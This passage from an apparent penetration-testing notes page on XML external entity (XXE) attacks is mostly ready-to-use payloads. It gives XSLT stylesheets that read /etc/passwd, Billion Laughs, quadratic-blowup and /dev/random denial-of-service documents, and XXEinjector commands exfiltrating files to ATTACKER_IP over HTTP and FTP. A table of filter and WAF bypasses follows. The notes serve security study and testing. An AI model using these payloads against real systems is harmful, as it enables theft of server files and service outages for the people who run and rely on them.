This is useful when application wraps your input in its **own** XML structure (a `DOCTYPE` can't be injected mid-document — it must precede the root element), or when it strips `DOCTYPE` declarations but still processes `<xi:include>`.
## XSLT-based XXE

>**[XSLT (Extensible Stylesheet Language Transformations)](https://en.wikipedia.org/wiki/XSLT)** is an XML-based language for transforming XML documents.

- If an application accepts a user-supplied XSLT stylesheet and applies it server-side, this can be exploited in XXE-injection-style attacks:

```xml
<?xml version="1.0"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <xsl:value-of select="document('file:///etc/passwd')"/>
  </xsl:template>
</xsl:stylesheet>
```

- Or via `xsl:import`:

```xml
<xsl:import href="file:///etc/passwd"/>
```

## Denial of Service via XXE

### The Billion Laughs attack

- If entity expansion limits are unset, it's possible to exploit XXE to trigger **exponential entity expansion** that causes massive memory/CPU consumption and eventually **crashes the server**. This DoS (Denial of Service) attack is known as **the Billion Laughs attack**.

```XML
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>
```

- Let's break this bad joke down:
	- The entity `lol` is `"lol"` = 3 characters.
	- `lol1` is 10 repetitions of `lol` → 10 "lol" = 30 characters.
	- `lol2` is 10 repetitions of `lol1` → 100 "lol" = 300 characters.
	- `...`
	- `lol9` is $10^9$ repetitions of `lol` → ~1 billion "lol" = **~3 billion characters** (~3 GB of memory).

>[!note] The name "Billion Laughs" comes from the common example where the first entity is the string `"lol"`, which expands exponentially to about a billion "lol" strings. 
>lol :D

### Quadratic blowup

- **Quadratic blowup** is a variation of the Billion Laughs attack that uses quadratic entity expansion rather than exponential.
- Less dramatic but more reliable against parsers with depth limits on recursive expansion.

```xml
<?xml version="1.0"?>
<!DOCTYPE bomb [
  <!ENTITY a "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa">
]>
<bomb>
&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;
  <!-- repeat hundreds more times -->
</bomb>
```

- A single entity of length `N` referenced `M` times produces `N×M` characters. Memory growth is quadratic in the number of references — less violent than exponential expansion but often sufficient to degrade service.

### Infinite stream

 - **Infinite stream** references an infinite or extremely large system resource:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE dos [
  <!ENTITY xxe SYSTEM "file:///dev/random">
]>
<dos>&xxe;</dos>
```

- On Unix, `/dev/random` generates an endless stream of random bytes. The parser reads indefinitely, consuming file descriptors and memory until the process is killed or the system runs out of resources. `/dev/urandom` produces the same result.

## Automated XXE exploitation with `XXEinjector`

- For complex OOB scenarios, manual payload construction becomes tedious. 
- [`XXEinjector`](https://github.com/enjoiz/XXEinjector) automates OOB XXE exploitation and file enumeration.


>[!note]+ Installation
> ```bash
> git clone https://github.com/enjoiz/XXEinjector.git
> cd XXEinjector
> ```

- Basic file enumeration using OOB via HTTP:

```bash
ruby XXEinjector.rb --host=ATTACKER_IP --httpport=8000 \
  --file=/path/to/request.txt --path=/etc/passwd --oob=http
```

- Enumerate all files in a directory:

```bash
ruby XXEinjector.rb --host=ATTACKER_IP --httpport=8000 \
  --file=/path/to/request.txt --path=/etc/ --oob=http --enumerate
```

- Use FTP for OOB:

```bash
ruby XXEinjector.rb --host=ATTACKER_IP --ftpport=21 \
  --file=/path/to/request.txt --path=/etc/passwd --oob=ftp
```

- The `request.txt` file is a raw HTTP request with `XXEINJECT` as a placeholder in the XML body where `XXEinjector` will inject its payload. Capture the request from Burp, replace the XML content field value with `XXEINJECT`, and save it.

## Filter and WAF bypass techniques

| Filter behavior                                                                  | Bypass                                                                                                                                                                                                                                                                                             |
| -------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Blocks `SYSTEM` keyword                                                          | Try `PUBLIC "..." "http://..."` — some filters only match `SYSTEM`.                                                                                                                                                                                                                                |
| Strips `<!DOCTYPE ...>` entirely                                                 | Use [[#XInclude injection]] — no `DOCTYPE` required.                                                                                                                                                                                                                                               |
| Blocks general entity declarations (`<!ENTITY name SYSTEM ...>`)                 | Use **parameter entities** (`% name`) — different namespace, frequently unfiltered.                                                                                                                                                                                                                |
| Inspects/blocks inline DTD content for suspicious keywords (`file://`, `SYSTEM`) | Move the payload to an **externally hosted DTD** ([[#OOB via external DTD]]) — the filter only sees a URL to your DTD, not the sensitive keywords themselves.                                                                                                                                      |
| Filters based on `Content-Type: application/xml` only                            | Try alternate XML MIME types the parser may still accept (`text/xml`, `application/soap+xml`) — see [[#Attack surface]].                                                                                                                                                                           |
| Legacy .NET apps using content-based encoding auto-detection                     | Historically, **UTF-7 encoded** XML declarations (`<?xml version="1.0" encoding="UTF-7"?>` with UTF-7-encoded payload bytes) bypassed ASCII-keyword filters looking for `SYSTEM`/`ENTITY` in older .NET/IIS stacks. Largely patched in modern frameworks but worth testing against legacy targets. |
| Denies outbound network entirely                                                 | Fall back to [[#Error-based exfiltration]].                                                                                                                                                                                                                                                        |
## References and further reading

- [`Finding and exploiting blind XXE vulnerabilities — PortSwigger`](https://portswigger.net/web-security/xxe/blind)
- [`XML External Entity (XXE) — hackviser`](https://hackviser.com/tactics/pentesting/web/xxe)
- [`XXE Complete Guide: Impact, Examples, and Prevention — hackerone`](https://www.hackerone.com/knowledge-center/xxe-complete-guide-impact-examples-and-prevention)
- [`XML External Entity (XXE) Processing — OWASP`](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing)
- [`XXE — phonexicum`](https://phonexicum.github.io/infosec/xxe.html)
- [`payloadbox/xxe-injection-payload-list`](https://github.com/payloadbox/xxe-injection-payload-list)
- [`XXE Injection — PayloadsAllTheThings`](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection)
- [`XXE: A complete guide to exploiting advanced XXE vulnerabilities — intigrity`](https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-advanced-xxe-vulnerabilities)
- [`Out-of-band XML external entity (OOB XXE) — invicti`](https://www.invicti.com/learn/out-of-band-xml-external-entity-oob-xxe/)
- [`XML External Entity (XXE) Injection Attack and Prevention`](https://www.invicti.com/blog/web-security/xxe-xml-external-entity-attacks/)
- [`XML External Entity (XXE) Limitations — DZone`](https://dzone.com/articles/xml-external-entity-xxe-limitations)
- [`XXE Cheatsheet — On Web-Security and -Insecurity`](https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html)
- [`XML Vulnerabilities and Attacks cheatsheet`](https://gist.github.com/mgeeky/4f726d3b374f0a34267d4f19c9004870)
- [`XXE Exploitation — OWASP`](https://owasp.org/www-chapter-pune/meetups/2019/November/XXE_Exploitation.pdf)
- [`XML External Entity Prevention Cheat Sheet — OWASP Cheat Sheet Series`](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
- [`Advanced XXE Exploitation — gosecure.github.io`](https://gosecure.github.io/xxe-workshop/#0)
- [`XXEinjector`](https://github.com/enjoiz/XXEinjector)

- TBD: stuff from advanced labs like repurposing local DTD